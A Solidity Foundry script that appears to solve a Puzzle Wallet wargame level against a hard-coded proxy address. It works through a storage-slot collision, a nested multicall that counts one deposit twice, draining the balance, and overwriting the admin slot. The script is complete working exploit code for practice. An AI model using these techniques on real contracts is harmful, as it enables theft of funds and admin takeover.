// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IPuzzleProxy {
    function deposit() external payable;
    function addToWhitelist(address addr) external;
    function proposeNewAdmin(address _newAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function upgradeTo(address _newImplementation) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;

    function admin() external view returns(address);
    function pendingAdmin() external view returns(address);
}

contract PuzzelSolve is Script {
    IPuzzleProxy proxy = IPuzzleProxy(0x7718346236c938317A14467f9169f2731c2Cf7e3);
    function run() external {
        vm.startBroadcast();

        console.log(address(proxy).balance);
        proxy.proposeNewAdmin(msg.sender);
        proxy.addToWhitelist(msg.sender);
        bytes memory  depositCall = abi.encodeWithSelector(proxy.deposit.selector);
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = depositCall;
        bytes memory nestedMulticall = abi.encodeWithSelector(proxy.multicall.selector, innerData);

        bytes[] memory outerData = new bytes[](2);
        outerData[0] = nestedMulticall;
        outerData[1] = depositCall;
        proxy.multicall{value: 1000000000000000}(outerData);
        proxy.execute(msg.sender, address(proxy).balance, "");
        console.log(address(proxy).balance);
        proxy.setMaxBalance(uint256(uint160(msg.sender)));
        console.log(proxy.admin());
        vm.stopBroadcast();
    }
}
